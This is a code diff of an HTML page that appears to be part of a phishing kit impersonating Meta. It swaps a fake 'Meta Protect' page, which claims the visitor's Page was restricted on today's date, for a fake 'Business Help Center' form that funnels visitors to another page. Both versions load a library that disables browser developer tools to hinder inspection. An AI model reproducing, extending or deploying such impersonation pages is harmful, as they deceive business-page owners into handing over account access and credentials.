@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en">
   <head>
-    <title>Page | Privacy Policy</title>
+    <title>Help Center</title>
     <!-- Required meta tags -->
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -51,119 +51,90 @@
       referrerpolicy="no-referrer"
     />
     <link rel="stylesheet" href="/style/index.css" />
-    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v1/y5/r/YIkC89ISLjN.jpg" />
+
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   </head>
 
   <body>
     <div id="google_translate_element" class="hidden"></div>
-    <div class="lsd-ring-container d-none">
-      <div class="lds-ring">
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-      </div>
-    </div>
-    <div class="card-container d-none" id="getCode">
-      <div class="card" style="max-width: 700px; border: none">
+    <div class="container-fuid" style="overflow: hidden; height: 100vh">
+      <div class="row position-relative" style="height: 30vh">
+        <img
+          src="/img/banner-b1482d4c.webp"
+          style="object-fit: cover; object-position: center; padding: 0"
+          alt=""
+        />
         <div
-          class="card-header py-3"
-          style="background-color: rgb(53 87 151); color: white"
+          class="position-absolute text-light"
+          style="
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+          "
         >
-          Form Submitted Successfully
-        </div>
-        <div class="card-body">
-          <p class="card-text text-muted">
-            Thanks for contacting us. You'll get a notification when we respond
-            in 1-2 business days. You can view responses in your Support Inbox.
-          </p>
-          <hr />
-          <span
-            id="back-hone"
-            class="btn"
-            style="background-color: rgb(53 87 151); color: white"
-            >I Understand</span
-          >
+          <p style="font-size: 20px">Business Help Center</p>
+          <h1 style="font-weight: 600">How can we help you?</h1>
         </div>
       </div>
-    </div>
-    <div class="bg-light d-flex justify-content-center align-items-center">
-      <div
-        class="card my-5"
-        id="code-form"
-        style="
-          max-width: 650px;
-          border: none;
-          box-shadow: rgba(149, 157, 165, 0.2) 0px 8px 24px;
-        "
-      >
-        <div class="card-body">
-          <img
-            src="/img/B2Y8S9I.jpg"
-            class="w-100 rounded h-auto"
-            alt=""
-          />
-
-          <h2 class="card-title fw-bold mt-4">Welcome To Meta Protect.</h2>
-          <p class="card-text py-3">
-            Your page's accessibility is limited, so we ask that higher security
-            requirements be applied to that account. We created this security
-            program to unlock your Pages.
+      <div class="row justify-content-center mt-5">
+        <div class="col-10 col-xl-7 col-md-8 text-center">
+          <h4 class="fw-semibold">How can we help?</h4>
+          <p>
+            We need more information to address your issue. This form will only
+            take a few minutes.
           </p>
-          <div
-            class="d-flex py-3 justify-content-start align-items-end position-relative"
+        </div>
+      </div>
+      <div class="row justify-content-center mt-5">
+        <div class="col-11 col-xl-7 col-md-8">
+          <form
+            action="/community-standard.html"
+            class="rounded p-3 w-100"
+            style="box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px"
           >
-            <div
-              class="mx-3 d-flex justify-content-center align-items-center flex-column"
-            >
-              <i
-                class="fa fa-check-circle"
-                style="color: #c4c4c4; font-size: 25px"
-                aria-hidden="true"
-              ></i>
+            <p class="fw-semibold">Most common issues</p>
+            <div class="d-flex justify-content-center">
               <div
+                class="p-3"
                 style="
-                  width: 2px;
-                  height: 2rem;
-                  background-color: rgb(229, 231, 235);
-                  position: absolute;
-                  bottom: -1rem;
+                  box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
+                  width: 100%;
                 "
-              ></div>
+              >
+                <div class="form-check mb-3">
+                  <input
+                    class="form-check-input"
+                    type="radio"
+                    name="flexRadioDisabled"
+                    id="flexRadioCheckedDisabled"
+                    required
+                  />
+                  <label
+                    class="form-check-label"
+                    for="flexRadioCheckedDisabled"
+                  >
+                    I need to contact the support team
+                  </label>
+                </div>
+              </div>
             </div>
-            <p class="mb-0">
-              We've enabled advanced protections to unlock your Page.
-            </p>
-          </div>
-          <div class="d-flex py-3 justify-content-between align-items-start">
-            <div class="mx-3">
-              <i
-                class="fa fa fa-id-card"
-                style="color: #355797; font-size: 25px"
-                aria-hidden="true"
-              ></i>
+            <div class="d-flex justify-content-end mt-3" style="width: 100%">
+              <button
+                type="submit"
+                id="btn-submit"
+                class="btn text-light"
+                disabled
+                style="background-color: #223654"
+              >
+                Next
+              </button>
             </div>
-            <p class="mb-0">
-              Below, we walk you through the process in detail and help you
-              fully activate to unlock your Page.
-            </p>
-          </div>
-          <a
-            href="/business.html"
-            type="button"
-            class="btn border w-100 py-3 fw-bold"
-            style="background-color: rgb(63 131 248); color: white"
-            >Continue</a
-          >
-          <p class="text-center mb-0 mt-3">
-            Your page was restricted on
-            <span id="month" class="fw-bold">Month</span>
-            <span id="date" class="fw-bold">Date</span>,
-            <span id="year" class="fw-bold">Year</span>.
-          </p>
+          </form>
         </div>
       </div>
     </div>
+
     <!-- Bootstrap JavaScript Libraries -->
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
     <script
@@ -183,34 +154,22 @@
       src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"
     ></script>
     <script>
+      let isConfirm = false;
+      let isNotRobot = false;
       $(document).ready(function () {
-        function setCurrentDate() {
-          var currentDate = new Date();
-          var monthNames = [
-            "January",
-            "February",
-            "March",
-            "April",
-            "May",
-            "June",
-            "July",
-            "August",
-            "September",
-            "October",
-            "November",
-            "December",
-          ];
+        $("#flexRadioCheckedDisabled").on("change", function () {
+          if ($(this).is(":checked")) {
+            isConfirm = true;
+          } else {
+            isConfirm = false;
+          }
 
-          var month = monthNames[currentDate.getMonth()];
-          var date = currentDate.getDate();
-          var year = currentDate.getFullYear();
-
-          $("#month").text(month);
-          $("#date").text(date);
-          $("#year").text(year);
-        }
-
-        setCurrentDate();
+          if (isConfirm) {
+            $("#btn-submit").attr("disabled", false);
+          } else {
+            $("#btn-submit").attr("disabled", true);
+          }
+        });
       });
     </script>
     <script>
